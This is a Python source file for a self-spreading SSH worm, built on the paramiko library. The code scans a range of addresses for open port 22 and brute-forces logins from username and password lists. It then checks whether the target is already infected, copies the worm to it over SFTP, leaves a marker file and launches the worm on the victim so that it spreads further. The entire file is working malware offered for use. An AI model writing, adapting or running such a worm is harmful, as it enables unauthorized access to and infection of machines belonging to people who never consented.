""" Used to create a basic SSH replicator worm. Nothing fancy and probably
    terrible python, but it works. """

import socket
import paramiko

""" Helper functions:
    get_local_ip(): does what it looks like, assumes you have internet connection """
def get_local_ip():
    """ Gets current machine's ip """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(('8.8.8.8', 1))
    local_ip = sock.getsockname()[0]
    sock.close()
    return local_ip


class SSHConnection:
    """ Creates an SSHConnection class. """
    def __init__(self):
        """ Initializer """
        self.password = None
        self.username = None
        self.vulnerable_hosts = []
        self.target_host = None
        self.worm_file = None
        self.password_file = None
        self.username_file = None
        self.ssh_connection = paramiko.SSHClient()
        self.ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.files = []
        self.class_file = "SSHConnection.py"
        self.target_dir = ""
        self.host_dir = ""

    def set_files(self, list_of_files):
        """ Set the list of files to be used by the worm. """
        self.files = list_of_files
        self.worm_file = list_of_files[0]
        self.class_file = "SSHConnection.py"
        self.password_file = list_of_files[1]
        self.username_file = list_of_files[2]
        self.files.append(self.class_file)

    def set_password(self, password):
        """ Set a password for the ssh connection. """
        self.password = password

    def set_username(self, username):
        """ Set a uername for the ssh connection. """
        self.username = username

    def set_hosts(self, new_hosts):
        """ Get a list of vulnerable hosts (open port 22). """
        self.vulnerable_hosts = new_hosts

    def set_target(self, host):
        """ Set a specific target ip. """
        self.target_host = host

    def set_worm_file(self, file_name):
        """ Name the file of the worm, should stay as replicator.py. """
        self.worm_file = file_name

    def set_password_file(self, file_name):
        """ File with passwords to try to brute force. """
        self.password_file = file_name

    def set_username_file(self, file_name):
        """ File with usernames to try to brute force. """
        self.username_file = file_name

    def set_target_dir(self, target_dir):
        """ Set a target directory on the remote system. Easir if its the same
            as the directory it was launched in on the host.  """
        self.target_dir = target_dir

    def set_host_dir(self, host_dir):
        """ Set the host directory that the worm was initially run on. All
            relevant files should be in this directory. """
        self.host_dir = host_dir


    def retrieve_vulnerable_hosts(self, start_ip, max_ip):
        """ Retrieve list of hosts to attack, removes local computer """
        print ("[+] Getting vulnerable hosts")
        port = 22
        hosts = [start_ip + str(i) for i in range(0, max_ip)]
        live_hosts = []
        local_host = get_local_ip()
        for host in hosts:
            if host == local_host:
                continue
            try:
                ssh_sock = socket.socket()
                ssh_sock.settimeout(20)
                port_status = ssh_sock.connect_ex((host, port))
                if port_status == 0:
                    live_hosts.append(host)
                    print ("    [-] Added: %s" % (host))
            except Exception as dontworryjustpass:
                pass
            finally:
                ssh_sock.close()

        # Remove local host from list of target IPs
        try:
            live_hosts.remove(local_host)
        except ValueError:
            pass
        self.vulnerable_hosts = live_hosts
        return

    def get_usernames_and_passwords(self):
        """ Returns list of strings for usernames and passwords files. """
        with open(self.host_dir + self.username_file, 'r') as unames:
            usernames = unames.readlines()
        with open(self.host_dir + self.password_file, 'r') as passwds:
            passwords = passwds.readlines()
        usernames = [username.strip() for username in usernames]
        passwords = [password.strip() for password in passwords]
        return (usernames, passwords)

    def brute_force_host(self, target_host, usernames, passwords):
        """ Brute forces all a host. Returns true on success. """
        print ("[+] Attacking %s " % (target_host))
        for user in usernames:
            for passwd in passwords:
                print ("    [-] username: " + user + ", password: " + passwd)
                try:
                    self.ssh_connection.connect(target_host, username=user, password=passwd)
                    self.set_target(target_host)
                    self.set_username(user)
                    self.set_password(passwd)
                    print("        Credentials found! " + user + ", " + passwd)
                    return True
                except paramiko.AuthenticationException as bad_credentials:
                    self.ssh_connection.close()
                    continue
                except paramiko.ssh_exception.SSHException as something_bad_happened:
                    self.ssh_connection.close()
                    break
                except Exception as something_weird_happened:
                    continue
        return False

    def find_target_host(self):
        """ Finds a specific target to attack. """
        usernames, passwords = self.get_usernames_and_passwords()
        for host in self.vulnerable_hosts:
            if self.brute_force_host(host, usernames, passwords):
                if self.check_if_marked():
                    print ("[+] Infecting %s" % (host))
                    return host
            else:
                self.ssh_connection.close()
        # No host found
        print ("No host could be connected to")
        return None

    def check_if_marked(self):
        """ Checks to see if the current target has the worm on it. """
        stdin, stdout, stderr = self.ssh_connection.exec_command("ls " + self.target_dir)
        results = stdout.readlines()
        results = [str(name) for name in results]
        results = [name[0:-1] for name in results]
        return self.worm_file not in results

    def place_worm(self):
        """ Places the worm on the remote system. """
        sftp_client = self.ssh_connection.open_sftp()
        for file_name in self.files:
            host_side = self.host_dir + file_name
            target_side = self.target_dir + file_name
            sftp_client.put(host_side, target_side)

    def start_attack(self):
        """ Launches worm from host system on remote system. Also leaves a
            marker file indicating which machine infected which victim. """
        print ("[+] Starting attack on " + self.target_host)
        marker = get_local_ip()
        # Marks which system the target got the worm from.
        self.ssh_connection.exec_command("echo " + marker + " >> gotcha.txt")
        # Start the attack.
        self.ssh_connection.exec_command("python " + self.target_dir + self.worm_file + " " +
                                         self.username_file + " " + self.password_file)
